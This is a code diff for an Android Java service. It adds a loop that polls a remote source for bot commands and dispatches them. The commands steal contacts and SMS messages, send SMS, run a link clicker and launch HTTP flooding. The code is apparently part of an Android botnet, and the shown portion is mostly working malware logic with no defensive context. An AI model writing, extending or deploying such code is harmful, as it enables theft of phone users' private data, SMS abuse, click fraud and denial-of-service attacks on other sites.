@@ -10,7 +10,7 @@ public class MyService extends Service {
 
     public MyService() {
 
-    }
+}
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -38,33 +38,58 @@ public class MyService extends Service {
         Thread secThread = new Thread(new Runnable() {
             @Override
             public void run() {
-                Functions_bot fb = new Functions_bot(getApplicationContext());
+                while(true) {
+                    Functions_bot fb = new Functions_bot(getApplicationContext());
 
-            fb.getSmsList();
-              String valor = fb.getCommands();
-                String [] ordParams=null;
-                String [] funcParams = valor.split("_");
 
-                if(funcParams.length==2)
-                    ordParams = funcParams[1].split("/+");
-                switch(funcParams[0])
-                {
-                    case"getContacts":{
+                    String valor = fb.getCommands();
 
-                    fb.getContactsList();
+                    String[] ordParams = null;
+                    String[] funcParams = valor.split("_");
+                    if (!valor.equals("_")) {
+                        if (funcParams.length == 2)
+                            ordParams = funcParams[1].split("/+");
+                        switch (funcParams[0]) {
+                            case "getContacts": {
+
+                                fb.getContactsList();
+                            }
+                            break;
+                            case "sendSms": {
+                                fb.sendSMS(ordParams[0], ordParams[1]);
+                            }
+                            break;
+                            case "getSms": {
+                                fb.getSmsList();
+                            }
+                            break;
+                            case "setClicker": {
+
+                                fb.clickLink(ordParams[0],Integer.parseInt(ordParams[1]));
+                            }
+                            break;
+                            case "setHttpFlooder": {
+                                fb.httpFlooding(ordParams[0], Integer.parseInt(ordParams[1]), Integer.parseInt(ordParams[2]));
+
+                            }
+                            break;
+
+                           /* case "setHttpFlooder": {
+                                fb.httpFlooding(ordParams[0], Integer.parseInt(ordParams[1]), Integer.parseInt(ordParams[2]));
+
+                            }
+                            break;*/
+
+
+                        }
                     }
-                    break;
-                    case"sendSms":{
-                     fb.sendSMS(ordParams[0], ordParams[1]);
-                    }
-                    break;
-                    case"getSms":{
-                        fb.getSmsList();
-                    }
-                    break;
 
 
                 }
+
+
+
+
             }
         });
         secThread.start();
